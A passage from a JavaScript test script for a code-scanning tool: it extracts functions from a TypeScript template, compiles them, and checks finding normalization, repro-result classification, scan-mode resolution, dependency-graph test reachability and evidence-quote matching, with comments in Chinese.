  return SOURCE.slice(start, end + 1);
}

/**
 * 抽取函数全文。返回类型写成内联对象类型(`): { a: string }`)会把大括号算进函数体,
 * 所以模板里需要被抽取的函数都用具名 interface 作返回类型。
 */
function extractFunction(name) {
  // 泛型函数在名字与括号之间有类型参数列表,例如 parseJsonLoose<T>(…)。async 函数要连关键字一起取。
  const match = new RegExp(`(?:async )?function ${name}(?:<[^>]*>)?\\(`).exec(SOURCE);
  if (match === null) throw new Error(`missing function ${name}`);
  let depth = 0;
  const end = scanCode(match.index, (char) => {
    if (char === "{") depth += 1;
    if (char === "}") depth -= 1;
    return char === "}" && depth === 0;
  });
  if (end < 0) throw new Error(`unterminated function ${name}`);
  return SOURCE.slice(match.index, end + 1);
}

/** 抽取单行 const。 */
function extractConstLine(name) {
  const match = new RegExp(`const ${name} = [^;\\n]+;`).exec(SOURCE);
  if (match === null) throw new Error(`missing const ${name}`);
  return match[0];
}

/** 抽取多行数组常量 `const NAME…= [ … ];`,配对方括号。 */
function extractArrayConst(name) {
  // 从等号右边的 `[` 开始扫:类型标注里的 `[]`(如 DimensionSpec[])不算数组本体。
  const match = new RegExp(`const ${name}[^=]*= \\[`).exec(SOURCE);
  if (match === null) throw new Error(`missing const ${name}`);
  let depth = 0;
  const end = scanCode(match.index + match[0].length - 1, (char) => {
    if (char === "[") depth += 1;
    if (char === "]") depth -= 1;
    return char === "]" && depth === 0;
  });
  if (end < 0) throw new Error(`unterminated const ${name}`);
  return SOURCE.slice(match.index, SOURCE.indexOf(";", end) + 1);
}

async function logicTests() {
  if (TSC === "" || !fs.existsSync(TSC)) {
    console.log("SKIP 逻辑测试:未提供 TSC=<typescript/lib/tsc.js>");
    return;
  }
  const workDir = mkdtemp("logic-");
  const parts = [];
  for (const [marker, kind] of DECL_BLOCKS) parts.push(extractDecl(marker, kind));
  for (const name of ARRAY_CONST_BLOCKS) parts.push(extractArrayConst(name));
  for (const name of CONST_BLOCKS) parts.push(extractConstLine(name));
  for (const name of RAW_TEMPLATE_BLOCKS) parts.push(`const ${name} = String.raw\`${rawBlock(name)}\`;`);
  // normPath 读模块级 workspaceRoot;抽出来的函数单独成模块时要把它补上(测试可以改它)。
  parts.push("export let workspaceRoot = '';");
  parts.push("export function setWorkspaceRoot(value: string): void { workspaceRoot = value; }");
  // readSourceFile 经 world.run 跑 READ_SOURCE_CODE 读文件。这里用内存文件系统代替:
  // 测试能看到它读了什么、没读什么——路径不对时直接是「未核对」(真实运行里那会是一张红色的失败步骤)。
  parts.push("const virtualFiles = new Map<string, string>();");
  parts.push("const readLog: string[] = [];");
  parts.push(
    "const world = { run: async (cmd: string, args: string[], _options?: unknown): Promise<{ exitCode: number; stdout: string; stderr: string }> => { if (args[1] === READ_SOURCE_CODE) { readLog.push(args[3]); const text = virtualFiles.get(args[3]); return { exitCode: 0, stdout: JSON.stringify(text === undefined ? { ok: false, reason: 'ENOENT' } : { ok: true, text, truncated: false }), stderr: '' }; } throw new Error(`unexpected world.run ${cmd}`); } };",
  );
  for (const name of FUNC_BLOCKS) parts.push(extractFunction(name));
  parts.push("export { severityAlias, squashForMatch, applyJudgeRanking, normalizeAssertion, normalizeRepro, classifyRepro, selectReproJobs, dedupeFindings, normalizeFinding, normalizeSelectors, resolveMode, selectorPathFor, dimensionLabel, slug, parseLocation, normalizeFlows, mermaidLabel, mermaidFlows, DIMENSIONS, SCAN_MODES, isGraphUnavailable, isTestPath, testReachHits, needsDependencyGraph, parseA11yOutput, relativeRepoPath, shortHash, quoteFound, quoteParts, citedLocations, nameKey, stepLocations, stepOverlap, FLOW_SAME_OVERLAP, digestFindings, firstErrorLine, normalizeSandboxRuns, sandboxResult, sandboxRevisionAsk, sandboxArgv, whereTarget, withRepo, groundFinding, SANDBOX_MAX_RUNS_PER_BATCH, REPRO_IMAGE, SANDBOX_RUNNER_SRC, virtualFiles, readLog };");
  const logicPath = path.join(workDir, "logic.ts");
  fs.writeFileSync(logicPath, parts.join("\n\n"));
  fs.writeFileSync(path.join(workDir, "package.json"), JSON.stringify({ type: "module" }));

  const compile = spawnSync(
    process.execPath,
    [TSC, "--strict", "--target", "es2022", "--module", "esnext", "--moduleResolution", "bundler", "--skipLibCheck", "--outDir", workDir, logicPath],
    { encoding: "utf8", timeout: 120000 },
  );
  if (compile.status !== 0) {
    throw new Error(`logic.ts 编译失败:\n${compile.stdout}\n${compile.stderr}`);
  }
  const logic = await import(pathToFileURL(path.join(workDir, "logic.js")).href);

  check("LOGIC:threshold 越界被拒(不钳制)", () => {
    const base = { script: "module.exports={run:()=>({})};", proves: "p" };
    assert(logic.normalizeRepro({ ...base, assertion: { kind: "ratio-greater", threshold: 0.1 } }) === null, "0.1 must be rejected");
    assert(logic.normalizeRepro({ ...base, assertion: { kind: "ratio-greater", threshold: 101 } }) === null, "101 must be rejected");
    const ok = logic.normalizeRepro({ ...base, assertion: { kind: "ratio-greater", threshold: 3 } });
    assert(ok !== null && ok.assertion.threshold === 3, "3 must be accepted");
  });

  check("LOGIC:throws 的 match 不能为空", () => {
    const base = { script: "module.exports={run:()=>({})};", proves: "p" };
    assert(logic.normalizeRepro({ ...base, assertion: { kind: "throws", match: "" } }) === null, "empty match rejected");
    assert(logic.normalizeRepro({ ...base, assertion: { kind: "throws", match: "x" } }) !== null, "non-empty accepted");
  });

  check("LOGIC:缺 script/proves/未知断言被拒", () => {
    assert(logic.normalizeRepro({ script: " ", assertion: { kind: "throws", match: "x" }, proves: "p" }) === null, "empty script");
    assert(logic.normalizeRepro({ script: "s", assertion: { kind: "throws", match: "x" }, proves: "" }) === null, "empty proves");
    assert(logic.normalizeRepro({ script: "s", assertion: { kind: "unknown" }, proves: "p" }) === null, "unknown kind");
  });

  const call = (exitCode) => ({ ok: true, exitCode, stdout: "", stderr: "", note: "" });
  const runner = (phase, payload, verdict) => ({ phase, payload, verdict, stdoutTail: "", stderrTail: "" });

  check("LOGIC:分类表 1 — world.run 抛异常 → error", () => {
    const out = logic.classifyRepro({ ...call(-1), ok: false, note: "timeout" }, null);
    assert(out.outcome === "error", out.outcome);
  });

  check("LOGIC:分类表 3/4 — docker 层失败 → error", () => {
    assert(logic.classifyRepro(call(125), null).outcome === "error", "125");
    assert(logic.classifyRepro(call(126), null).outcome === "error", "126");
    assert(logic.classifyRepro(call(127), null).outcome === "error", "127");
    assert(logic.classifyRepro(call(1), null).outcome === "error", "1 + no runner");
  });

  check("LOGIC:分类表 5 — runner phase 出错 → unavailable", () => {
    const out = logic.classifyRepro(call(0), runner("spec", null, null));
    assert(out.outcome === "unavailable" && out.stage === "spec", JSON.stringify(out));
  });

  check("LOGIC:分类表 6 — 无判定数据 → unavailable", () => {
    assert(logic.classifyRepro(call(0), runner("run", null, null)).outcome === "unavailable", "null payload");
  });

  check("LOGIC:分类表 7 — load/contract/serialize/run → unavailable", () => {
    for (const stage of ["load", "contract", "serialize", "run"]) {
      const out = logic.classifyRepro(call(0), runner("run", { stage, error: "e" }, null));
      assert(out.outcome === "unavailable" && out.stage === stage, stage);
    }
  });

  check("LOGIC:分类表 8/9/10 — done + verdict", () => {
    assert(logic.classifyRepro(call(0), runner("run", { stage: "done", data: {} }, true)).outcome === "reproduced", "true");
    assert(logic.classifyRepro(call(0), runner("run", { stage: "done", data: {} }, false)).outcome === "notReproduced", "false");
    assert(logic.classifyRepro(call(0), runner("run", { stage: "done", data: {} }, null)).outcome === "unavailable", "null");
  });

  check("LOGIC:分类表 11 — 未知 stage fail-closed", () => {
    const out = logic.classifyRepro(call(0), runner("run", { stage: "weird", data: {} }, true));
    assert(out.outcome === "unavailable", "must not be reproduced");
  });

  check("LOGIC:notReproduced 文案不含「假阳性」", () => {
    const out = logic.classifyRepro(call(0), runner("run", { stage: "done", data: {} }, false));
    assert(!out.note.includes("假阳性"), out.note);
    assert(out.note === "脚本未观察到预期行为", out.note);
  });

  check("LOGIC:timedOut 覆盖 done 结果 → unavailable", () => {
    const runnerWithTimeout = { phase: "run", payload: { stage: "done", data: {} }, verdict: true, timedOut: true, stdoutTail: "", stderrTail: "" };
    const out = logic.classifyRepro(call(0), runnerWithTimeout);
    assert(out.outcome === "unavailable", `timeout must override done, got ${out.outcome}`);
  });

  check("LOGIC:断言字面量不被改写(长值/空白)", () => {
    const base = { script: "module.exports={run:()=>({})};", proves: "p" };
    const longExpected = "x".repeat(1000) + "y";
    assert(logic.normalizeRepro({ ...base, assertion: { kind: "not-equals", expected: longExpected } }) === null, "over-long expected must be rejected, not truncated");
    assert(logic.normalizeRepro({ ...base, assertion: { kind: "throws", match: "m".repeat(401) } }) === null, "over-long match must be rejected");
    const spaced = "a  b";
    const ok = logic.normalizeRepro({ ...base, assertion: { kind: "throws", match: spaced } });
    assert(ok !== null && ok.assertion.match === spaced, "match must keep exact whitespace");
  });

  check("LOGIC:只挑 high/medium + verified + 有 repro,上限 12", () => {
    const findings = [];
    for (let index = 0; index < 20; index += 1) {
      findings.push({
        dimension: "quality", where: `f${index}.js:1`, problem: `p${index}`, evidence: "e",
        severity: index % 3 === 0 ? "low" : "medium", fix: "f", repo: "r", dir: ".",
        key: `k${index}`, status: "verified", note: "n",
        repro: { script: "s", assertion: { kind: "throws", match: "x" }, proves: "p" },
      });
    }
    const jobs = logic.selectReproJobs(findings);
    assert(jobs.length === 12, `expected 12, got ${jobs.length}`);
    assert(jobs.every((job) => job.finding.severity !== "low"), "low must be excluded");
  });

  check("LOGIC:未通过证据核对的发现不进入复现", () => {
    const finding = {
      dimension: "quality", where: "a.js:1", problem: "p", evidence: "e", severity: "high", fix: "f",
      repo: "r", dir: ".", key: "k", status: "unconfirmed", note: "n",
      repro: { script: "s", assertion: { kind: "throws", match: "x" }, proves: "p" },
    };
    assert(logic.selectReproJobs([finding]).length === 0, "unconfirmed must be excluded");
  });

  check("LOGIC:去重保留 repro 规格与 verified 优先", () => {
    const base = {
      dimension: "quality", where: "a.js:1", problem: "p", evidence: "e", severity: "high", fix: "f",
      repo: "r", dir: ".",
    };
    const unconfirmed = { ...base, key: "k1", status: "unconfirmed", note: "n", repro: { script: "s", assertion: { kind: "throws", match: "x" }, proves: "p" } };
    const verified = { ...base, key: "k2", status: "verified", note: "n" };
    const merged = logic.dedupeFindings([unconfirmed, verified]);
    assert(merged.length === 1, `expected 1, got ${merged.length}`);
    assert(merged[0].status === "verified", "verified wins");
    assert(merged[0].repro !== undefined, "repro must survive dedupe");
  });

  check("LOGIC:normalizeFinding 保留合法 repro,丢弃非法并留 note", () => {
    const notes = [];
    const good = logic.normalizeFinding(
      {
        dimension: "perf", where: "a.js:10", problem: "慢", evidence: "e", severity: "high", fix: "f",
        repro: { script: "module.exports={run:()=>({})};", assertion: { kind: "ratio-greater", threshold: 3 }, proves: "p" },
      },
      notes,
    );
    assert(good !== null && good.repro !== undefined, "valid repro kept");
    const bad = logic.normalizeFinding(
      {
        dimension: "perf", where: "b.js:10", problem: "慢", evidence: "e", severity: "high", fix: "f",
        repro: { script: "s", assertion: { kind: "ratio-greater", threshold: 0.5 }, proves: "p" },
      },
      notes,
    );
    assert(bad !== null && bad.repro === undefined, "invalid repro dropped");
    assert(notes.some((note) => /复现规格无效/.test(note)), "note recorded");
  });

  check("LOGIC:同义 severity 收敛;真正未知的才回落", () => {
    const notes = [];
    // security 现在是注册表里的维度,只有表外的名字才算无法识别。
    const mapped = logic.normalizeFinding(
      { dimension: "banana", where: "a.js:1", problem: "p", evidence: "e", severity: "critical", fix: "f" },
      notes,
    );
    assert(mapped !== null, "finding kept");
    assert(mapped.severity === "high" && mapped.dimension === "quality", `${mapped.severity}/${mapped.dimension}`);
    assert(notes.some((note) => note.includes("维度无法识别")), "unknown dimension is noted");
    const unknown = logic.normalizeFinding({ where: "a.js:1", problem: "p", severity: "banana" }, notes);
    assert(unknown !== null && unknown.severity === "medium", "unknown severity falls back to medium");
    assert(notes.some((note) => note.includes("严重度无法识别")), "unknown severity is noted");
  });

  const mkChecked = (key, status = "unconfirmed") => ({
    dimension: "quality", where: "a.js:1", problem: "p" + key, evidence: "e", severity: "low", fix: "f",
    repo: "r", dir: ".", key, status, note: "n",
  });
  const mkInput = (key) => ({ key, repo: "r", where: "a.js:1", problem: "p", evidence: "e", severity: "low", status: "unconfirmed" });

  check("LOGIC:评审长合并重复项,已验证者当幸存者", () => {
    const checked = [mkChecked("f1"), mkChecked("f2", "verified"), mkChecked("f3")];
    const ji = checked.map((finding) => mkInput(finding.key));
    const out = logic.applyJudgeRanking([{ key: "f1", merged: ["f2"] }, { key: "f3" }], checked, ji, checked);
    assert(out.ranked.length === 2, `expected 2, got ${out.ranked.length}`);
    assert(out.ranked[0].key === "f2", "verified survivor wins the group");
    assert(out.notes.some((note) => note.includes("合并重复项 1 条")), "merge note missing");
  });

  check("LOGIC:评审长输出不完整退回确定性顺序", () => {
    const checked = [mkChecked("f1"), mkChecked("f2")];
    const ji = checked.map((finding) => mkInput(finding.key));
    const out = logic.applyJudgeRanking([{ key: "f1" }], checked, ji, checked);
    assert(out.ranked.length === 2, "no finding may be lost");
    assert(out.notes.some((note) => note.includes("不完整")), "fallback note missing");
  });

  check("LOGIC:未知/重复 key 被忽略,未送出的按序追加", () => {
    const checked = [mkChecked("f1"), mkChecked("f2"), mkChecked("f3")];
    const ji = [mkInput("f1"), mkInput("f2")];
    const out = logic.applyJudgeRanking([{ key: "f2" }, { key: "f2" }, { key: "zz" }, { key: "f1" }], checked, ji, checked);
    assert(out.ranked.map((finding) => finding.key).join(",") === "f2,f1,f3", `got ${out.ranked.map((finding) => finding.key).join(",")}`);
    assert(out.notes.some((note) => note.includes("无效或重复")), "ignored note missing");
    assert(out.notes.some((note) => note.includes("未覆盖 1 条")), "unsent note missing");
  });

  check("LOGIC:压扁的多行引用能匹配原文", () => {
    const fileText = ["function pageSize(items, size) {", "  const pages = [];", "  for (let i = 0; i <= items.length; i += size) {", "    pages.push(items.slice(i, i + size));", "  }", "  return pages;", "}"].join("\n");
    const quote = "function pageSize(items, size) { const pages = []; for (let i = 0; i <= items.length; i += size) { pages.push(items.slice(i, i + size)); } return pages; }";
    assert(logic.squashForMatch(fileText).includes(logic.squashForMatch(quote)), "squashed quote must match squashed file");
    assert(logic.squashForMatch("a  b\n\nc\t d") === "a b c d", "whitespace collapses to single spaces");
  });

  check("LOGIC:模式解析 — 空、中文名、组合、未识别", () => {
    const notes = [];
    const empty = logic.resolveMode(undefined, notes);
    assert(empty.id === "full" && empty.dimensions.join(",") === "quality,dead-code,perf" && notes.length === 0, "empty → full, no note");
    const perf = logic.resolveMode(" 性能 ", notes);
    assert(perf.id === "perf" && perf.dimensions.join(",") === "perf" && perf.requireEveryDimension, "chinese label resolves");
    const combo = logic.resolveMode("perf,db 性能", notes);
    assert(combo.id === "perf+db" && combo.label === "性能+数据库查询", `combo id/label: ${combo.id}/${combo.label}`);
    assert(combo.dimensions.join(",") === "perf,db", "duplicate token counts once");
    assert(logic.resolveMode("perf,quality", notes).dimensions.join(",") === "quality,perf", "dimensions follow registry order");
    const bogus = logic.resolveMode("banana", notes);
    assert(bogus.id === "full", "nothing recognised → full");
    assert(notes.some((note) => note.includes("未识别的扫描方向: banana") && note.includes("可选: full/")), "unknown token must be named with the menu");
  });

  check("LOGIC:模式解析 — 迁移文档是文档模式;custom 不强制覆盖", () => {
    const notes = [];
    const migration = logic.resolveMode("迁移文档,perf", notes);
    assert(migration.kind === "document" && migration.id === "migration" && migration.dimensions.join(",") === "migration", JSON.stringify(migration));
    assert(notes.some((note) => note.includes("已忽略: 性能")), "the companion that was ignored must be named");
    const custom = logic.resolveMode("custom", notes);
    assert(custom.requireEveryDimension === false, "custom is goal-driven");
    assert(custom.dimensions.includes("security") && !custom.dimensions.includes("migration"), "custom spans the findings dimensions only");
    assert(logic.resolveMode("full", []).requireEveryDimension === true, "full requires every dimension");
  });

  check("LOGIC:模式表与维度表自洽,覆盖 Devin 菜单上的 11 种", () => {
    const ids = logic.DIMENSIONS.map((spec) => spec.id);
    assert(new Set(ids).size === ids.length, "dimension ids must be unique");
    assert(new Set(logic.SCAN_MODES.map((mode) => mode.id)).size === logic.SCAN_MODES.length, "mode ids must be unique");
    for (const mode of logic.SCAN_MODES) {
      for (const id of mode.dimensions.split(",")) {
        assert(ids.includes(id), `mode ${mode.id} references unknown dimension ${id}`);
      }
      if (mode.kind === "findings" && mode.id !== "custom") {
        for (const id of mode.dimensions.split(",")) {
          assert(logic.DIMENSIONS.find((spec) => spec.id === id).reviewer !== "", `mode ${mode.id} scans ${id}, which has no reviewer criteria`);
        }
      }
    }
    // 存档里已有的三个 id 不改名,否则老规则全部失效。
    for (const legacy of ["quality", "dead-code", "perf"]) assert(ids.includes(legacy), `legacy dimension renamed: ${legacy}`);
    const labels = logic.SCAN_MODES.map((mode) => mode.label);
    for (const label of DEVIN_SCAN_TYPES) assert(labels.includes(label), `missing Devin scan type: ${label}`);
    assert(logic.SCAN_MODES[0].id === "full", "full must stay first: resolveMode falls back to it");
  });

  check("LOGIC:规则存档按模式分文件,且不会与仓库名撞车", () => {
    assert(logic.selectorPathFor("repo", "full") === ".code-scan/selectors/repo.json", "full keeps the legacy path");
    assert(logic.selectorPathFor("repo", "perf") === ".code-scan/selectors/repo~perf.json", "perf archive");
    assert(logic.selectorPathFor("repo", "perf+db") === ".code-scan/selectors/repo~perf-db.json", "combined archive");
    assert(logic.slug("a~b") === "a-b", "repo keys must never contain the separator");
    assert(logic.slug("repo~perf") === "repo-perf", "a repo named like a mode-suffixed key gets a different key");
    // 组合模式的 id 常有共同前缀:只截断会让两个组合落到同一个文件上,后面必须接完整 id 的哈希。
    const longA = "quality+dead-code+coverage+cleanup+telemetry+db";
    const longB = "quality+dead-code+coverage+cleanup+telemetry+a11y";
    const pathA = logic.selectorPathFor("repo", longA);
    const pathB = logic.selectorPathFor("repo", longB);
    assert(pathA !== pathB, `long combined modes must not share an archive: ${pathA}`);
    assert(pathA.startsWith(".code-scan/selectors/repo~quality-dead-code-covera-") && pathA.endsWith(".json"), pathA);
    assert(logic.selectorPathFor("repo", longA) === pathA, "the hash must be deterministic");
    assert(logic.shortHash("a") !== logic.shortHash("b") && /^[0-9a-z]+$/.test(logic.shortHash("a")), "shortHash is a deterministic base-36 digest");
  });

  check("LOGIC:不在本次模式维度内的规则被丢弃并留 note", () => {
    const caps = { npm: false, ast: false, graph: false, knip: false, jscpd: false, notes: [] };
    const selector = (id, kind, dimension) => ({ id, kind, lang: "", query: "x", scope: "", target: "", exclude: "", intent: "i", dimension, budget: 0 });
    const raw = [selector("p1", "grep", "perf"), selector("q1", "grep", "quality"), selector("s1", "scope", "perf")];
    const notes = [];
    const kept = logic.normalizeSelectors(raw, caps, notes, ["perf"]);
    assert(kept.map((item) => item.id).join(",") === "p1,s1", `got ${kept.map((item) => item.id).join(",")}`);
    assert(notes.some((note) => note.includes("不在本次模式维度内的选择器: q1(quality)")), "dropped rule must be named");
    assert(logic.normalizeSelectors(raw, caps, []).length === 3, "no mode given → no dimension filter");
  });

  check("LOGIC:模式外的发现不进清单,原文记进说明;模式内的照常保留", () => {
    const base = { where: "a.js:1", problem: "p", evidence: "e", severity: "low", fix: "f" };
    const notes = [];
    const out = logic.normalizeFinding({ ...base, dimension: "quality" }, notes, ["perf"]);
    assert(out === null, "an out-of-mode finding has not been judged against that mode's rubric and must not enter the list");
    assert(notes.some((note) => note.includes("维度外发现(quality)") && note.includes("a.js:1") && note.includes("p")), notes.join(" | "));
    const kept = logic.normalizeFinding({ ...base, dimension: "quality" }, notes, ["perf", "quality"]);
    assert(kept !== null && kept.dimension === "quality", "an in-mode finding is kept as labelled");
    assert(logic.normalizeFinding({ ...base, dimension: "banana" }, [], ["db"]).dimension === "db", "unknown falls to the first active dimension");
    assert(logic.normalizeFinding({ ...base, dimension: "banana" }, []).dimension === "quality", "no mode given → legacy default");
    assert(logic.dimensionLabel("a11y") === "无障碍" && logic.dimensionLabel("nope") === "nope", "labels come from the registry");
  });

  check("LOGIC:位置解析与 Mermaid 转义", () => {
    const located = logic.parseLocation("src/a.ts:12 做了什么");
    assert(located.path === "src/a.ts" && located.line === 12 && located.note === "做了什么", JSON.stringify(located));
    const ranged = logic.parseLocation("src\\a.ts:12-40");
    assert(ranged.path === "src/a.ts" && ranged.line === 12 && ranged.note === "", JSON.stringify(ranged));
    assert(logic.parseLocation("src/a.ts").line === 0, "no line → 0");
    assert(logic.mermaidLabel('a"b[c]{d}<e>&f') === "a&quot;bcd&lt;e&gt;&amp;f", logic.mermaidLabel('a"b[c]{d}<e>&f'));
  });

  check("LOGIC:流程规范化 — 丢弃缺名字或缺入口的,截断超长步骤并留 note", () => {
    const notes = [];
    const flows = logic.normalizeFlows(
      [
        {
          name: "下单", entry: "src/index.js:10",
          steps: Array.from({ length: 14 }, (_, index) => `s${index}.js:1 第${index}步`),
          systems: ["MySQL — 订单", 42], risks: "not-a-list",
        },
        { name: "", entry: "x:1", steps: [], systems: [], risks: [] },
        { name: "缺入口", steps: [] },
        "junk",
      ],
      notes,
    );
    assert(flows.length === 1 && flows[0].steps.length === 12, `got ${flows.length} flows, ${flows[0] && flows[0].steps.length} steps`);
    assert(flows[0].systems.length === 1 && flows[0].risks.length === 0, "non-strings and non-lists are dropped");
    assert(notes.some((note) => note.includes("有 14 步")), "truncated steps must be noted");
    assert(notes.filter((note) => note.includes("缺名字或缺入口")).length === 2, notes.join(" | "));
  });

  check("LOGIC:流程图只画核对通过的步骤", () => {
    const flow = {
      name: '下单"流程"', repo: "r", entry: "src/index.js:10", entryLocation: "src/index.js:10",
      steps: [], verifiedSteps: ["src/order.js:5 校验(金额)"], systems: [], risks: [], unverified: [],
    };
    const chart = logic.mermaidFlows([flow, { ...flow, name: "空", entryLocation: "", verifiedSteps: [] }]);
    assert(chart.startsWith("flowchart TD\n"), "one flowchart");
    assert(chart.includes('subgraph F1["下单&quot;流程&quot;"]'), "subgraph title is escaped");
    // 节点只写核对通过的「文件:行号」,不写说明:说明里的次要位置可能没通过核对。
    assert(chart.includes('F1S0["index.js:10"]') && chart.includes('F1S1["order.js:5"]') && !chart.includes("校验"), chart);
    assert((chart.match(/-->/g) || []).length === 1 && !chart.includes("F1S2"), "two nodes, one edge");
    assert((chart.match(/subgraph/g) || []).length === 1, "a flow with no grounded location is not drawn");
  });

  check("LOGIC:测试可达性 — 从测试文件沿导入边可达的模块不报,其余报并带扇入", () => {
    // src/only-target.js 只被引用、自己不引用别人(不是图的 key),且引用它的模块测试够不着;dist/gen.test.js 是生成目录里的测试。
    const graph = {
      edges: new Map([
        ["test/a.test.js", ["src/a.js"]],
        ["src/a.js", ["src/b.js", "src/c.js"]],
        ["src/b.js", []],
        ["src/c.js", []],
        ["src/d.js", ["src/b.js", "src/only-target.js"]],
        ["src/types.d.ts", []],
        ["vite.config.js", []],
        ["src/e.mjs", []],
        ["dist/gen.test.js", ["src/unreached-by-gen.js"]],
      ]),
      fanIn: new Map([["src/a.js", 1], ["src/b.js", 2], ["src/c.js", 1], ["src/d.js", 0], ["src/e.mjs", 0]]),
      cycles: [],
      note: "",
    };
    const hits = logic.testReachHits(graph);
    assert(
      hits.map((hit) => hit.path).join(",") === "src/d.js,src/e.mjs,src/only-target.js,src/unreached-by-gen.js",
      hits.map((hit) => hit.path).join(","),
    );
    assert(hits.every((hit) => hit.line === 0 && hit.provenance === "test-reach"), "structural hits carry no line");
    assert(hits[0].excerpt.includes("被 0 个模块依赖") && hits[1].excerpt.includes("没有任何测试文件"), hits[0].excerpt);
    const noTests = logic.testReachHits({ ...graph, edges: new Map([["src/a.js", []]]), fanIn: new Map() });
    assert(noTests.length === 1 && noTests[0].excerpt.includes("仓库里没有识别出测试文件"), noTests[0].excerpt);
  });

  check("LOGIC:测试文件的路径特征", () => {
    for (const hit of ["test/paginate.test.js", "src/__tests__/a.ts", "tests/b.spec.tsx", "spec/c.js", "src/d.test.mjs"]) {
      assert(logic.isTestPath(hit), `must be a test path: ${hit}`);
    }
    for (const miss of ["src/contest.js", "src/latest.js", "src/attest/x.js", "test-utils/a.js", "src/a.ts"]) {
      assert(!logic.isTestPath(miss), `must not be a test path: ${miss}`);
    }
  });

  check("LOGIC:依赖图只在有 graph 或 test-reach 规则时才需要", () => {
    const selector = (kind, query) => ({ id: query || kind, kind, lang: "", query, scope: "", target: "", exclude: "", intent: "", dimension: "coverage", budget: 0 });
    assert(logic.needsDependencyGraph([selector("graph", "cycle")]), "graph rule");
    assert(logic.needsDependencyGraph([selector("tool", "test-reach")]), "test-reach");
    assert(logic.needsDependencyGraph([selector("grep", "x")]) === false, "grep needs no graph");
    assert(logic.needsDependencyGraph([selector("tool", "knip")]) === false, "knip needs no graph");
  });

  check("LOGIC:工具规则在能力缺失时被丢弃并点名", () => {
    const off = { npm: true, ast: false, graph: false, knip: false, jscpd: false, a11y: false, notes: [] };
    const selector = (tool) => ({ id: tool, kind: "tool", lang: "", query: tool, scope: "", target: "", exclude: "", intent: "i", dimension: "coverage", budget: 0 });
    const notes = [];
    assert(logic.normalizeSelectors([selector("test-reach"), selector("a11y"), selector("knip"), selector("jscpd"), selector("bogus")], off, notes, ["coverage"]).length === 0, "nothing can run without capabilities");
    for (const tool of ["test-reach", "a11y", "knip", "jscpd"]) {
      assert(notes.some((note) => note.includes(`丢弃 ${tool} 选择器`)), `missing drop note for ${tool}: ${notes.join(" | ")}`);
    }
    assert(notes.some((note) => note.includes("未知工具选择器")), "unknown tool must be named");
    const on = { npm: true, ast: true, graph: true, knip: true, jscpd: true, a11y: true, notes: [] };
    assert(logic.normalizeSelectors([selector("test-reach"), selector("a11y")], on, []).length === 2, "all capabilities on → kept");
  });

  check("LOGIC:依赖图不可用是环境问题,不算死规则", () => {
    const run = (kind, tool, note) => ({ id: "x", kind, intent: "", dimension: "coverage", tool, hits: 0, sampled: 0, files: 0, note, signals: [], paths: [] });
    assert(logic.isGraphUnavailable(run("tool", "test-reach", "test-reach 未运行: madge 失败: x")), "test-reach outage");
    assert(logic.isGraphUnavailable(run("graph", "", "未准备依赖图")), "graph outage");
    assert(logic.isGraphUnavailable(run("tool", "test-reach", "所有模块都能从测试文件到达")) === false, "clean result is not an outage");
    assert(logic.isGraphUnavailable(run("tool", "knip", "test-reach 未运行: x")) === false, "note text on another tool is not an outage");
  });

  check("LOGIC:无障碍输出解析 — 每条 lint 消息一个命中;路径不再剥前缀;坏输出返回 null", () => {
    // 反斜杠用 fromCharCode 拼出来,免得转义在编辑器或脚本里被吃掉。
    const backslash = String.fromCharCode(92);
    const stdout = JSON.stringify([
      { file: "src/Bad.jsx", line: 6, column: 7, ruleId: "jsx-a11y/alt-text", message: "img elements must have an alt prop", severity: 2 },
      { file: `.${backslash}src${backslash}Typed.tsx`, line: 11, column: 7, ruleId: "jsx-a11y/alt-text", message: "No alt", severity: 2 },
      { file: "../outside.js", line: 1, ruleId: "x", message: "m" },
      { file: "src/ok.js", line: 3, ruleId: "", message: "ignored file warning" },
      { file: "src/repo/src/inner.js", line: 2, ruleId: "jsx-a11y/alt-text", message: "keeps its prefix" },
      "junk",
    ]);
    const hits = logic.parseA11yOutput(stdout);
    assert(hits !== null && hits.map((hit) => hit.path).join(",") === "src/Bad.jsx,src/Typed.tsx,src/repo/src/inner.js", JSON.stringify(hits && hits.map((hit) => hit.path)));
    assert(hits[0].line === 6 && hits[0].excerpt === "jsx-a11y/alt-text: img elements must have an alt prop" && hits[0].provenance === "eslint jsx-a11y", JSON.stringify(hits[0]));
    // 驱动给的是相对仓库根目录的路径:仓库目录恰好叫 repo 时,repo/src/… 里的前缀不能被当成仓库目录剥掉。
    assert(logic.relativeRepoPath("repo/src/Bad.jsx") === "repo/src/Bad.jsx", "an already-relative path must not lose a same-named prefix");
    for (const bad of ["", "not json", '[{"file":"a', '{"a":1}', "[] trailing junk"]) {
      assert(logic.parseA11yOutput(bad) === null, `unusable output must be reported as such, got a value for ${JSON.stringify(bad)}`);
    }
    assert(logic.parseA11yOutput("[]").length === 0, "a clean run yields an empty list");
  });

  check("LOGIC:接地认得省略号写法,但不被碎片糊弄", () => {
    const file = "route(request, response) {\n  if (request.url.startsWith(\"/orders\")) {\n    return listOrdersHandler(request, response);\n  }\n}";
    assert(logic.quoteFound(file, "request.url.startsWith(...)"), "an abridged quote whose literal parts exist matches");
    assert(logic.quoteFound(file, "if (request.url.startsWith(\"/orders\")) {…}"), "ellipsis in the middle");
    assert(logic.quoteFound(file, "return listOrdersHandler(request, response);"), "a verbatim quote matches");
    assert(!logic.quoteFound(file, "request.url.endsWith(...)"), "a wrong literal part does not match");
    assert(!logic.quoteFound(file, "try {"), "a tiny fragment is never evidence");
    assert(!logic.quoteFound(file, "npm error code ENOTCACHED"), "a quoted command is not source");
    assert(logic.quoteParts("return listOrdersHandler(...);…route(request, response)").join("|") === "return listOrdersHandler|route(request, response)", "parts split on every ellipsis form; tiny parts are dropped");
    assert(logic.firstErrorLine("npm error code ENOTCACHED\nnpm error cache mode is only-if-cached\nmore") === "npm error code ENOTCACHED", "first npm error line wins");
    assert(logic.firstErrorLine("plain failure\nlast line") === "last line", "falls back to the last line");
  });

  check("LOGIC:给全局评审员的发现摘要按整条截断", () => {
    const finding = (index) => ({
      dimension: "perf", where: `a${index}.js:1`, problem: `p${index}`.repeat(20), evidence: "e".repeat(100), severity: "low", fix: "f",
      repo: "r", dir: ".", key: `k${index}`, status: "unconfirmed", note: "n",
    });
    const digest = logic.digestFindings([finding(1), finding(2), finding(3), finding(4)], 400);
    assert(digest.includes("另有 3 条未列出") && digest.split("\n").length === 2, digest);
    for (const line of digest.split("\n").slice(0, 1)) {
      assert(JSON.parse(line.replace(/,$/, "")).where === "a1.js:1", "every listed line is a complete JSON object");
    }
